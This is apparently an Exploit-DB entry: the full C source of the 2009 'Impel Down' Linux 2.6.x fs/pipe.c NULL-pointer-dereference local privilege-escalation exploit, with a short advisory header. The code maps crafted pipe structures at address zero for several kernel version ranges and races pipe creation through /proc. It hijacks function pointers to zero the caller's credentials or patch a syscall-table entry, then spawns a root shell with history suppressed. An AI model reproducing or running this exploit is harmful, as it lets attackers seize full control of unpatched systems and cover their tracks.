/*
EDB Note: Updated exploit ~ https://www.exploit-db.com/exploits/33322/

source: https://www.securityfocus.com/bid/36901/info

Linux kernel is prone to a local privilege-escalation vulnerability that is caused by a NULL-pointer dereference.

Local attackers can exploit this issue to execute arbitrary code with kernel-level privileges. Successful exploits will result in the complete compromise of affected computers. Failed exploit attempts will result in a denial-of-service condition.
*/

/******************************************************************************
 *                            .:: Impel Down ::.
 *
 *     Linux 2.6.x fs/pipe.c local kernel root(kit?) exploit (x86)
 *                              by teach & xipe
 *    Greetz goes to all our mates from #nibbles, #oldschool and #carib0u
 *    (hehe guyz, we would probably be high profile and mediatised el8 if we
 *    lost less time on trolling all day long, but we LOVE IT :)))
 *    Special thanks to Ivanlef0u, j0rn & pouik for being such amazing (but i
 *    promise ivan, one day i'll kill u :p)
 *
 * (C) COPYRIGHT teach & xipe, 2009
 * All Rights Reserved
 *
 * teach@vxhell.org
 * xipe@vxhell.org
 *
 *******************************************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <stdint.h>
#include <sched.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/personality.h>

/* First of all, im about to teach (hehe, just like mah nick) you mah powerful copy-and-past skillz */

// didn't really care about this. i mixed 2.6.0 to 2.6.31 :)

#define PIPE_BUFFERS (16)

struct __wait_queue_head {
      int spinlock;

      void *next, *prev; // struct list_head
};

struct fasync_struct {  // bleh! didn't change from 2.6.0 to 2.6.31
	int magic;
	int fa_fd;
	struct fasync_struct *fa_next;
	void *file; // struct file
};

// this iz the w00t about 2.6.11 to 2.6.31
struct pipe_buf_operations {
        int suce;
        int *fptr[6];
};


// from 2.6.0 to 2.6.10
struct pipe_inode_info_2600_10 {
        struct __wait_queue_head wait;
        char *base; // !!!!!
        unsigned int len; // !!!
        unsigned int start; // !!!
        unsigned int readers;
        unsigned int writers;
        unsigned int waiting_writers;
        unsigned int r_counter;
        unsigned int w_counter;
        struct fasync_struct *fasync_readers;
        struct fasync_struct *fasync_writers;
};

// from 2.6.11 to 2.6.16
struct pipe_buffer_2611_16 {
        void *suce;
        unsigned int offset, len;
        struct pipe_buf_operations *ops;
};

struct pipe_inode_info_2611_16 {
        struct __wait_queue_head wait;
        unsigned int nrbufs, curbuf;
        struct pipe_buffer_2611_16 bufs[PIPE_BUFFERS];
        void *tmp_page;
        unsigned int start;
        unsigned int readers;
        unsigned int writers;
        unsigned int waiting_writers;
        unsigned int r_counter;
        unsigned int w_counter;
        struct fasync_struct *fasync_readers;
        struct fasync_struct *fasync_writers;
};

// from 2.6.17 to 2.6.19
struct pipe_buffer_2617_19 {
        void *suce;
        unsigned int offset, len;
        struct pipe_buf_operations *ops;
        unsigned int tapz;
};

struct pipe_inode_info_2617_19 {
        struct __wait_queue_head wait;
        unsigned int nrbufs, curbuf;
        struct pipe_buffer_2617_19 bufs[PIPE_BUFFERS];
        void *tmp_page;
        unsigned int start;
        unsigned int readers;
        unsigned int writers;
        unsigned int waiting_writers;
        unsigned int r_counter;
        unsigned int w_counter;
        struct fasync_struct *fasync_readers;
        struct fasync_struct *fasync_writers;
        void *suce;
};

// from 2.6.20 to 2.6.22
struct pipe_buffer_2620_22 {
        void *suce;
        unsigned int offset, len;
        struct pipe_buf_operations *ops;
        unsigned int tapz;
};

struct pipe_inode_info_2620_22 {
        struct __wait_queue_head wait;
        unsigned int nrbufs, curbuf;
        void *tmp_page;
        unsigned int start;
        unsigned int readers;
        unsigned int writers;
        unsigned int waiting_writers;
        unsigned int r_counter;
        unsigned int w_counter;
        struct fasync_struct *fasync_readers;
        struct fasync_struct *fasync_writers;
        void *suce;
        struct pipe_buffer_2620_22 bufs[PIPE_BUFFERS];
};

// AND FINALY from 2.6.23 to 2.6.31 ... :))
struct pipe_buffer_2623_31 {
        void *suce;
        unsigned int offset, len;
        struct pipe_buf_operations *ops;
        unsigned int tapz;
        unsigned long tg;
};

struct pipe_inode_info_2623_31 {
        struct __wait_queue_head wait;
        unsigned int nrbufs, curbuf;
        void *tmp_page;
        unsigned int start;
        unsigned int readers;
        unsigned int writers;
        unsigned int waiting_writers;
        unsigned int r_counter;
        unsigned int w_counter;
        struct fasync_struct *fasync_readers;
        struct fasync_struct *fasync_writers;
        void *suce;
        struct pipe_buffer_2623_31 bufs[PIPE_BUFFERS];
};



static pid_t uid;
static gid_t gid;
static int iz_kern2600_10;
unsigned long taskstruct[1024];
void gomu_gomu_nooooo_gatling_shell(void);
int get_kern_version(void);
void map_struct_at_null(void);
void get_cur_task_and_escalate_priv(void);
void* get_null_page(void);
void error(char *s);
int is_done(int new);

static inline void *get_4kstack_top()
{
	void *stack;

	__asm__ __volatile__ (
	"movl $0xfffff000,%%eax ;"
	"andl %%esp, %%eax ;"
	"movl %%eax, %0 ;"
	: "=r" (stack)
	);
	return stack;
}

static inline void *get_8kstack_top()
{
	void *stack;

	__asm__ __volatile__ (
	"movl $0xffffe000,%%eax ;"
	"andl %%esp, %%eax ;"
	"movl %%eax, %0 ;"
	: "=r" (stack)
	);
	return stack;
}

static inline void *get_current()
{
      void *cur = *(void **)get_4kstack_top();
      if( ( (unsigned int *)cur >= (unsigned int *)0xc0000000 ) && ( *(unsigned int *)cur == 0 ) )
            return cur;
	else
	      cur = *(void **)get_8kstack_top();
	return cur;
}



void map_struct_at_null()
{
      struct pipe_inode_info_2600_10 *pipe2600_10;

      struct pipe_inode_info_2611_16 *pipe2611_16;

      struct pipe_inode_info_2617_19 *pipe2617_19;

      struct pipe_inode_info_2620_22 *pipe2620_22;

      struct pipe_inode_info_2623_31 *pipe2623_31;

      struct pipe_buf_operations luffy;


      FILE *f;
      unsigned int *sct_addr;
      unsigned int sc_addr;
	char dummy;
	char sname[256], pipebuf[10];
	int ret, i;
	void *page;

      page = get_null_page();
      int version = get_kern_version();

      luffy.suce = 1;
      for(i = 0; i < 6; i++)
            luffy.fptr[i] = (int *)get_cur_task_and_escalate_priv;

      // ok lets go ...
      if(version >= 2600 && version <= 2610)
      {
            iz_kern2600_10 = 1;

            /* we are going to ninja an obsolete syscall from teh sys_call_table: sys_olduname
             * i don't bother to restore it after owning the kernel. implement it if u want :p
             */

             // hehe as u see, his imperial majesty spender haz alwayz good trickz

	      f = fopen("/proc/kallsyms", "r");
	      if (f == NULL)
	      {
		      f = fopen("/proc/ksyms", "r");
		      if (f == NULL)
		      {
			      error("0hn000es. i cant open /proc/{kall,k}syms for looking after teh sys_call_table addr. maybe u should set it yourself!");
		      }
	      }

	      ret = 0;
	      while(ret != EOF)
	      {
		      ret = fscanf(f, "%p %c %s\n", (void **)&sct_addr, &dummy, sname);
		      if (ret == 0)
		      {
			      fscanf(f, "%s\n", sname);
			      continue;
		      }
		      if (!strcmp("sys_call_table", sname))
		      {
			      printf("\t\t+ sys_call_table is at %p\n",(void *)sct_addr);
			      fclose(f);
		      }
	      }

            if(f != NULL)
            {
	            fclose(f);
	            error("0hn000es. i cant get sys_olduname addr. maybe u should set it yourself!");
	      }

	      sc_addr = (unsigned int) (sct_addr + __NR_olduname*sizeof(int));

	      pipe2600_10 = (struct pipe_inode_info_2600_10 *) page;
	      memcpy(pipebuf, (char *) &sc_addr, sizeof(int));
	      pipe2600_10->base = pipebuf;
	      pipe2600_10->len = 0;
	      pipe2600_10->start = 0;
	      pipe2600_10->writers = 1;
	      printf("\t\t+ Structs for kernels 2.6.0 => 2.6.10 were mapped\n");

      }

      else if(version >= 2611 && version <= 2616)
      {
            pipe2611_16 = (struct pipe_inode_info_2611_16 *) page;
	      pipe2611_16->writers = 1;
	      pipe2611_16->nrbufs = 1;
	      for(i = 0; i < PIPE_BUFFERS; i++)
	            pipe2611_16->bufs[i].ops = &luffy;
	      printf("\t\t+ Structs for kernels 2.6.11 => 2.6.16 were mapped\n");
      }

      else if(version >= 2617 && version <= 2619)
      {
            pipe2617_19 = (struct pipe_inode_info_2617_19 *) page;
            pipe2617_19->readers = 1;
	      pipe2617_19->nrbufs = 1;
	      for(i = 0; i < PIPE_BUFFERS; i++)
	            pipe2617_19->bufs[i].ops = &luffy;
	      pipe2617_19->wait.next = &pipe2617_19->wait.next;
            pipe2617_19->wait.spinlock = 1;
            printf("\t\t+ Structs for kernels 2.6.16 => 2.6.19 were mapped\n");
      }

      else if(version >= 2620 && version <= 2622)
      {
            pipe2620_22 = (struct pipe_inode_info_2620_22 *) page;
            pipe2620_22->readers = 1;
	      pipe2620_22->nrbufs = 1;
	      for(i = 0; i < PIPE_BUFFERS; i++)
	            pipe2620_22->bufs[i].ops = &luffy;
	      pipe2620_22->wait.next = &pipe2620_22->wait.next;
            pipe2620_22->wait.spinlock = 1;
            printf("\t\t+ Structs for kernels 2.6.20 => 2.6.22 were mapped\n");
      }

      else if(version >= 2623 && version <= 2631)
      {
            pipe2623_31 = (struct pipe_inode_info_2623_31 *) page;
            pipe2623_31->readers = 0;
	      pipe2623_31->nrbufs = 0;
	      for(i = 0; i < PIPE_BUFFERS; i++)
	            pipe2623_31->bufs[i].ops = &luffy;
	      pipe2623_31->wait.next = &pipe2623_31->wait.next;
            pipe2623_31->wait.spinlock = 1;
            printf("\t\t+ Structs for kernels 2.6.23 => 2.6.31 were mapped\n");
      }

      else
            error("errrr! exploit not developped for ur kernel!");



}

int get_kern_version(void) // return something like 2600 for kernel 2.6.0, 2619 for kernel 2.6.19 ...
{
    struct utsname buf;
    char second[2],third[3];
    int version = 2000;
    if(uname(&buf) < 0)
            error("can't have ur k3rn3l version. this box isn't for today :P\n");
    sprintf(second, "%c", buf.release[2]);
    second[1] = 0;
    version += atoi(second) * 100;

    third[0] = buf.release[4];
    if(buf.release[5] >= '0' || buf.release[5] <= '9')
    {
            third[1] = buf.release[5];
            third[2] = 0;
            version += atoi(third);
    }
    else
    {
            third[1] = 0;
            version += third[0] - '0';
    }

    printf("\t\t+ Kernel version %i\n", version);

    return version;

}

// from our g0dz spender & julien  :] lullz
void* get_null_page(void)
{
	void *page;
	if ((personality(0xffffffff)) != PER_SVR4)
	{
		page = mmap(NULL, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, 0, 0);
		if (page != NULL)
		{
			page = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, 0, 0);
			if (page != NULL)
			{
				error("this box haz a motherfuckin mmap_min_addr-like stuff! burn it if u can !@#*");
			}
		}
	      else
	      {
		      if (mprotect(NULL, 4096, PROT_READ | PROT_WRITE | PROT_EXEC) < 0)
		      {
		            free(page);
			      error("HELL! can't mprotect my null page !@#*. goto /dev/null !");
			}
		}
	}
	else
	{
	      // may be we are lucky today ... :)
	      page = mmap(NULL, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, 0, 0);
		if (page != NULL)
		{
			page = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, 0, 0);
			if (page != NULL)
			{
				error("this box haz a motherfuckin mmap_min_addr-like stuff! burn it if u can !@#*");
			}
		}
	      else
	      {
		      if (mprotect(NULL, 4096, PROT_READ | PROT_WRITE | PROT_EXEC) < 0) // ... or not ! :(
		      {
		            free(page);
			      error("HELL! can't mprotect my null page !@#*. goto /dev/null !");
			}
		}
	}
	printf("\t\t+ Got null page\n");
	return page;
}

void gomu_gomu_nooooo_gatling_shell(void) // sgrakkyu & twiz are el8 :))
{
      char *argv[] = { "/bin/sh", "--noprofile", "--norc", NULL };
      char *envp[] = { "TERM=linux", "PS1=blackbird\\$  ", "BASH_HISTORY=/dev/null",
                   "HISTORY=/dev/null", "history=/dev/null",
                   "PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin", NULL };

      execve("/bin/sh", argv, envp);
      error("hheeeehhh! unable to spawn a sh");
}



int is_done(int new)
{
	static int done = 0;
	if (done == 1)
		return (1);
	done = new;
}

volatile int done = 0;

void get_cur_task_and_escalate_priv()
{
	uint32_t	i;
	uint32_t	*task = get_current();
	uint32_t 	*cred = 0;


	for(i=0; i<0x1000; i++)
      {
           if( (task[i] == task[i+1]) && (task[i+1] == task[i+2]) && (task[i+2] == task[i+3]))
           {
                  task[i] = 0;
                  task[i+1] = 0;
                  task[i+2] = 0;
                  task[i+3] = 0;
                  is_done(1);
                  return;
           }
      }

	for (i = 0; i<1024; i++)
	{
		taskstruct[i] = task[i];
		cred = (uint32_t *)task[i];
		if (cred == (uint32_t *)task[i+1] && cred > (uint32_t *)0xc0000000) {
			cred++; /* Get ride of the cred's 'usage' field */
	        	if (cred[0] == uid && cred[1] == gid
		            && cred[2] == uid && cred[3] == gid
		            && cred[4] == uid && cred[5] == gid
		            && cred[6] == uid && cred[7] == gid)
		        {
				/* Get root */
		         	cred[0] = cred[2] = cred[4] = cred[6] = 0;
		                cred[1] = cred[3] = cred[5] = cred[7] = 0;
				break;
		        }
		}
	}
	is_done(1);
}

int main(int ac, char **av)
{
	int fd[2];
	int pid;
	char tapz[4];


	uid = getuid();
	gid = getgid();
	setresuid(uid, uid, uid);
	setresgid(gid, gid, gid);

	map_struct_at_null();

	//while (1)
	{
		pid = fork();
		if (pid == -1)
		{
			perror("fork");
			return (-1);
		}
		if (pid)
		{
			char path[1024];
			/* I assume next opened fd will be 4 */
			sprintf(path, "/proc/%d/fd/4", pid);
			while (!is_done(0))
			{
				fd[0] = open(path, O_RDWR);
				if (fd[0] != -1)
				{
					if(iz_kern2600_10)
                              {
                                    memcpy(tapz, (char *)get_cur_task_and_escalate_priv, sizeof(int));
                                    write(fd[0], tapz, 4);
                              }
					close(fd[0]);
				}
			}
			if(iz_kern2600_10)
                  {
                        syscall(__NR_olduname, NULL);
                  }
                  printf("\t\t+ Got root!\n");
			gomu_gomu_nooooo_gatling_shell();
			return (0);
		}

		while (!is_done(0))
		{
			if (pipe(fd) != -1)
			{
				close(fd[0]);
				close(fd[1]);
			}
		}
	}
}